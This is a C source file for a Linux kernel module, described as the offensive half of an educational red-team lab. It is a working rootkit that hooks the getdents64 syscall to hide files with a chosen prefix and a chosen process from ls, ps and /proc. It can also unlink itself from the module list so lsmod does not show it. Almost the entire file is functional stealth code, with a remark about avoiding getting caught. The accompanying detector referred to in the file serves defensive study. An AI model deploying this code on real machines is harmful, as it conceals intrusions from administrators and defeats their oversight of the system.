// SPDX-License-Identifier: GPL-2.0
/* ===========================================================================
 * rootkit.c — RED TEAM (educational): hide files and a PID via an ftrace hook.
 * ===========================================================================
 *
 *                        *** FOR A THROWAWAY VM ONLY ***
 *
 * This module demonstrates, at a high level, two of the oldest LKM-rootkit
 * techniques so that you can then DETECT them with ../detector.c (the half this
 * lab actually cares about). It is deliberately simple and noisy. Do not run it
 * on any machine you care about; load it only inside a disposable QEMU/KVM guest
 * that you can reset.
 *
 * WHAT IT DOES
 * ------------
 *  (1) File & PID hiding by hooking the getdents64 syscall. `ls`, `find`, and
 *      readdir() in glibc all end up in getdents64; if we filter its results,
 *      any directory entry whose name starts with `hide_prefix` (default "rk_")
 *      disappears, and the /proc entry for `hide_pid` disappears — so the
 *      process vanishes from `ps`, `top`, and `ls /proc`.
 *
 *  (2) DKOM self-hiding (optional, `hide_self=1`): unlink this module from the
 *      kernel's module list so it stops appearing in `lsmod` / /proc/modules.
 *      "DKOM" = Direct Kernel Object Manipulation: we mutate an in-memory kernel
 *      data structure (the module list) rather than going through any API. This
 *      is the essence of what DKOM rootkits do to hide processes, modules, and
 *      network connections.
 *
 * WHY BOTH HALVES SHIP: the lab pairs every offensive tool with the blue-team
 * detector, because understanding the exact artifact a technique leaves behind
 * is what lets you find it. Read ../detector.c next — it catches (1) by noticing
 * the getdents64 fentry site changed, and it explains how a cross-view scan
 * catches (2).
 * ===========================================================================
 */

#include <linux/module.h>       /* module_init/exit, MODULE_*, THIS_MODULE     */
#include <linux/kernel.h>       /* pr_info and friends                         */
#include <linux/init.h>         /* __init / __exit                             */
#include <linux/slab.h>         /* kzalloc / kfree                             */
#include <linux/uaccess.h>      /* copy_from_user / copy_to_user               */
#include <linux/string.h>       /* memcmp / memmove / strncmp                  */
#include <linux/list.h>         /* list_del / list_add for the DKOM self-hide  */
#include <linux/version.h>
#include <linux/ptrace.h>       /* struct pt_regs                              */

#include "ftrace_helper.h"      /* our heavily-commented ftrace hook installer */

MODULE_LICENSE("GPL");          /* GPL: ftrace/kprobe symbols are GPL-only     */
MODULE_AUTHOR("low-level-linux-lab");
MODULE_DESCRIPTION("Educational LKM rootkit (file/PID hiding) — throwaway VM only");
MODULE_VERSION("0.1");

/* ---- tunables, set at load time: `insmod rootkit.ko hide_pid=1337` ---------*/
static char *hide_prefix = "rk_";   /* directory entries starting with this... */
module_param(hide_prefix, charp, 0644);
MODULE_PARM_DESC(hide_prefix, "hide dir entries whose name starts with this");

static char *hide_pid = "";         /* ...and the /proc/<hide_pid> entry, vanish */
module_param(hide_pid, charp, 0644);
MODULE_PARM_DESC(hide_pid, "PID (as a string) to hide from /proc");

static bool hide_self;              /* DKOM: unlink from the module list        */
module_param(hide_self, bool, 0644);
MODULE_PARM_DESC(hide_self, "if 1, hide this module from lsmod (cannot rmmod after)");

/* ---------------------------------------------------------------------------
 * struct linux_dirent64 — the on-the-wire layout getdents64 writes into the
 * user buffer. We declare it ourselves because it is not in a stable module-
 * facing header. This MUST match the kernel/glibc ABI exactly or our pointer
 * walk over the buffer desynchronizes.
 *
 *   d_reclen is the KEY field: it is the total byte length of THIS record,
 *   including the variable-length, NUL-terminated d_name and any padding. To
 *   walk the buffer you step forward by d_reclen each time. To DELETE a record
 *   you either memmove the tail over it (if it is first) or add its length to
 *   the PREVIOUS record's d_reclen so the record is skipped over. Corrupt
 *   d_reclen and userspace readdir() walks off into garbage.
 * --------------------------------------------------------------------------- */
struct linux_dirent64 {
	u64            d_ino;       /* 64-bit inode number                     */
	s64            d_off;       /* offset to the next dirent               */
	unsigned short d_reclen;    /* length of THIS record (the load-bearing */
	unsigned char  d_type;      /*   field; see above)                     */
	char           d_name[];    /* NUL-terminated filename (flexible array) */
};

/* On x86-64 with CONFIG_ARCH_HAS_SYSCALL_WRAPPER (the default), the real
 * syscall function takes a single `const struct pt_regs *` holding the user's
 * registers at the trap: rdi=arg0, rsi=arg1, rdx=arg2, ... So for
 * getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count):
 *   regs->di = fd, regs->si = dirp (user pointer), regs->dx = count.
 * We save the real syscall here and call it to get the true directory listing,
 * then edit the results before they reach userspace. */
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

/* Decide whether a directory entry name should be hidden. Two independent
 * rules: a configurable filename prefix, and the exact /proc PID string. */
static bool should_hide(const char *name)
{
	size_t plen = strlen(hide_prefix);

	if (plen && strncmp(name, hide_prefix, plen) == 0)
		return true;                        /* e.g. "rk_secret"            */
	if (hide_pid[0] && strcmp(name, hide_pid) == 0)
		return true;                        /* e.g. the "1337" dir in /proc */
	return false;
}

/* ---------------------------------------------------------------------------
 * hook_getdents64 — our replacement for the getdents64 syscall.
 *
 * Flow:
 *   1. Call the real syscall so the kernel fills the USER buffer and returns
 *      the number of bytes written (ret). ret<=0 means EOF or error: nothing to
 *      filter, pass it straight through.
 *   2. Copy the user buffer into a KERNEL buffer. We must never walk a user
 *      pointer directly: it can change under us (TOCTOU) and may fault. copy_*_
 *      user is the only sanctioned crossing of the user/kernel boundary; it
 *      returns the number of bytes it could NOT copy (0 == full success).
 *   3. Walk the kernel copy record by record. Splice out any record whose name
 *      should_hide(), by (a) memmove for the first record or (b) growing the
 *      previous record's d_reclen to swallow this one.
 *   4. Copy the edited buffer back to userspace and return the adjusted length.
 * --------------------------------------------------------------------------- */
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
	/* arg1 (rsi) is the user's dirent buffer pointer. __user documents that
	 * it is an untrusted userspace address that must go through copy_*_user. */
	struct linux_dirent64 __user *dirent =
		(struct linux_dirent64 __user *)regs->si;

	long ret = orig_getdents64(regs);   /* the REAL listing + byte count     */
	struct linux_dirent64 *kbuf, *cur, *prev = NULL;
	unsigned long off = 0;
	long err;

	if (ret <= 0)
		return ret;                     /* EOF or error: nothing to hide     */

	/* Kernel scratch copy. GFP_KERNEL is fine: syscall context can sleep. If
	 * the allocation fails we degrade gracefully to the unmodified listing —
	 * a rootkit that oopses on ENOMEM is a rootkit that gets you caught. */
	kbuf = kzalloc(ret, GFP_KERNEL);
	if (!kbuf)
		return ret;

	/* Cross into userspace to pull the buffer in. A nonzero return means a
	 * partial copy (bad user pointer); bail out leaving the original intact. */
	if (copy_from_user(kbuf, dirent, ret))
		goto out;

	/* Walk records. `off` indexes bytes; each step advances by d_reclen. */
	while (off < (unsigned long)ret) {
		cur = (void *)kbuf + off;

		if (should_hide(cur->d_name)) {
			if (cur == kbuf) {
				/* First record: slide the whole tail left over it,
				 * shrinking the total length. We re-loop WITHOUT
				 * advancing `off` because a new record now sits here. */
				ret -= cur->d_reclen;
				memmove(cur, (void *)cur + cur->d_reclen,
					ret - off);
				continue;
			}
			/* Not first: extend the previous record to cover this one.
			 * readdir() steps by d_reclen, so it jumps clean over the
			 * hidden entry — it is still physically in the buffer, just
			 * unreachable. This is the trick that makes it "invisible." */
			prev->d_reclen += cur->d_reclen;
		} else {
			prev = cur;             /* this record survives; remember it */
		}
		off += cur->d_reclen;
	}

	/* Push the edited listing back. Again, copy_to_user is the only legal way
	 * to write a user address; failure leaves userspace with a short/original
	 * buffer, which readdir() tolerates. */
	err = copy_to_user(dirent, kbuf, ret);
	if (err)
		pr_debug("rootkit: copy_to_user short by %ld\n", err);

out:
	kfree(kbuf);
	return ret;
}

/* One entry in our hook table. Hooking getdents64 covers modern userspace
 * (glibc readdir uses it). The legacy 32-bit getdents uses a DIFFERENT struct
 * (struct linux_dirent, no d_type at the end) and would need its own handler;
 * we leave that as a stretch to keep the teaching core focused. */
static struct ftrace_hook rk_hooks[] = {
	{
		.name     = "__x64_sys_getdents64",
		.function = hook_getdents64,
		.original = &orig_getdents64,
	},
};

/* ---------------------------------------------------------------------------
 * DKOM self-hide. THIS_MODULE->list is the node linking us into the global
 * `modules` list that /proc/modules and lsmod walk. list_del() splices us out,
 * so the walk never reaches us — the module keeps running, just invisibly.
 *
 * We stash the previous node so hide is (in principle) reversible, but note the
 * catch spelled out in the README: once hidden, `rmmod rootkit` can't find us
 * either, so you must reboot the throwaway VM. That is why hide_self defaults
 * off. This same list-splicing idea is how DKOM rootkits hide PROCESSES (unlink
 * from the task list) and network connections. The detector's answer is a
 * cross-view scan: compare this list against a source that DKOM didn't edit.
 * --------------------------------------------------------------------------- */
static struct list_head *saved_prev;

static void rk_hide_self(void)
{
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	pr_info("rootkit: unlinked from module list (now hidden from lsmod)\n");
}

static int __init rootkit_init(void)
{
	int err;

	/* Bootstrap symbol resolution (kallsyms_lookup_name via a kprobe). */
	err = fh_init_kallsyms();
	if (err) {
		pr_err("rootkit: cannot resolve kallsyms_lookup_name: %d\n", err);
		return err;
	}

	err = fh_install_hooks(rk_hooks, ARRAY_SIZE(rk_hooks));
	if (err) {
		pr_err("rootkit: failed to install hooks: %d\n", err);
		return err;
	}

	pr_info("rootkit: loaded. hiding prefix='%s' pid='%s'%s\n",
		hide_prefix, hide_pid, hide_self ? " (+self)" : "");

	if (hide_self)
		rk_hide_self();

	return 0;
}

static void __exit rootkit_exit(void)
{
	/* If we hid ourselves this exit path is unreachable (rmmod can't find us),
	 * but keep the code correct for the hide_self=0 case. */
	fh_remove_hooks(rk_hooks, ARRAY_SIZE(rk_hooks));
	pr_info("rootkit: unloaded, hooks removed\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
